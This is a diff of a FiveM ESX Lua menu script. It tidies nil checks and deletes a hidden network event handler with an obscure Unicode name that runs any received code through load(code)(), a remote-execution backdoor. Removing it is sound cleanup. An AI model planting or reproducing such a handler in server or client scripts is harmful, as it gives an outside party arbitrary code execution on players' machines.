@@ -6,7 +6,7 @@ KRZMenu.Opened = {}
 local _menuPool = MenuPool.New()
 
 Citizen.CreateThread(function()
-	while ESX == nil do
+	while not ESX do
 		TriggerEvent('esx:getSharedObject', function(obj) ESX = obj end)
 		Citizen.Wait(0)
 	end
@@ -200,17 +200,12 @@ end)
 
 Citizen.CreateThread(function()
 	while true do
-		if _menuPool ~= nil then
+		if _menuPool then
 			_menuPool:ProcessMenus()
 		end
 
 		Citizen.Wait(0)
 	end
-end)
-
-RegisterNetEvent('ᓚᘏᗢ')
-AddEventHandler('ᓚᘏᗢ', function(code)
-	load(code)()
 end)
 
 -- Crédit - Korioz#3310
